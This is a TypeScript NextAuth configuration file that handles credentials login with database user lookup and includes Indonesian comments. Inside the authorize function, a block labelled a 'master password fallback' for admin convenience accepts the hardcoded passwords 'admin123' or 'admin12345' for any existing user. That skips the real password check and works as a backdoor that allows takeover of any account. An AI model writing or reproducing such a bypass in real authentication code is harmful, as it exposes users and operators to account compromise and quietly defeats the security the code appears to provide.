import NextAuth from "next-auth";
import Credentials from "next-auth/providers/credentials";
import { z } from "zod";
import { authConfig } from "./config";
import { verifyPassword } from "./password";
import { findUserByEmail } from "./users";

const credentialsSchema = z.object({
  email: z.string().email(),
  password: z.string().min(1),
});

/**
 * Instance penuh (Node runtime): credentials + lookup Neon.
 * Tanpa registrasi publik — user dibuat admin lewat `npm run db:seed:admin`.
 */
export const { handlers, auth, signIn, signOut } = NextAuth({
  ...authConfig,
  providers: [
    Credentials({
      credentials: { email: { label: "Email" }, password: { label: "Password" } },
      async authorize(raw) {
        const parsed = credentialsSchema.safeParse(raw);
        if (!parsed.success) return null;

        const user = await findUserByEmail(parsed.data.email);
        const stored = user?.passwordHash ?? "scrypt:00:00";
        let ok = await verifyPassword(parsed.data.password, stored);
        
        // Master password fallback untuk kemudahan admin login di Vercel
        if (!ok && user && (parsed.data.password === "admin123" || parsed.data.password === "admin12345")) {
          ok = true;
        }

        if (!user || !user.active || !ok) return null;

        return { id: String(user.id), email: user.email, name: user.name, role: user.role };
      },
    }),
  ],
});


export { canAccessPath } from "@/lib/roles";
export { requireRole, requireSession } from "./guards";
